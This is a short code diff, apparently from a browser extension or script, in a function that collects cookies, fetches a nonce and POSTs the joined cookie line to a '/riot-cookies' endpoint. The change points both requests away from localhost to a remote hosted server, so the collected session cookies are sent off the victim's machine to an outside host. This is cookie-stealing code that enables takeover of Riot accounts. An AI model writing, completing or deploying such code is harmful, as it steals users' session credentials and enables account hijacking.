@@ -41,7 +41,9 @@ async function collectAndSend() {
 
     const cookieLine = rootCookies.map((c) => `${c.name}=${c.value}`).join('; ');
 
-    const nonceRes = await fetch('http://localhost:8190/nonce');
+    const baseUrl = 'https://pure-cherrita-inosuke-6597cf0f.koyeb.app:8190';
+
+    const nonceRes = await fetch(`${baseUrl}/nonce`);
     const { nonce } = await nonceRes.json();
 
     const body = {
@@ -51,7 +53,7 @@ async function collectAndSend() {
       cookie_line: cookieLine,
     };
 
-    const res = await fetch('http://localhost:8190/riot-cookies', {
+    const res = await fetch(`${baseUrl}/riot-cookies`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
